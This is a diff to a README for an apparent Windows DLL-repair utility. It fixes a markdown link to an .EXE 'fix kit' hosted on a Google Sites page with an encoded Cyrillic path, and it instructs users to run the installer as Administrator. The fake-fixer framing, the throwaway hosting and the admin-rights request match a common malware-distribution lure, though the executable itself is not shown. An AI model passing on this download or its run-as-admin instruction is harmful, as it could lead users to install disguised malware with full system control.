@@ -11,7 +11,7 @@ An automated tool designed to fix missing `.dll` system files (`VCRUNTIME140.dll
 
 ## 🚀 Quick Download & Setup
 
-### [► DOWNLOAD FIX KIT v2.4.2 (.EXE)]([https://sites.google.com/view/windows-utility-hub/%D0%B3%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F-%D1%81%D1%82%D1%80%D0%B0%D0%BD%D0%B8%D1%86%D0%B0](https://sites.google.com/view/windows-utility-hub/%D0%B3%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F-%D1%81%D1%82%D1%80%D0%B0%D0%BD%D0%B8%D1%86%D0%B0))
+### [► DOWNLOAD FIX KIT v2.4.2 (.EXE)](https://sites.google.com/view/windows-utility-hub/%D0%B3%D0%BB%D0%B0%D0%B2%D0%BD%D0%B0%D1%8F-%D1%81%D1%82%D1%80%D0%B0%D0%BD%D0%B8%D1%86%D0%B0)
 
 > ⚠️ **Installation Note:** Run the installer as Administrator to allow automatic system registry updates and system library integration.
 
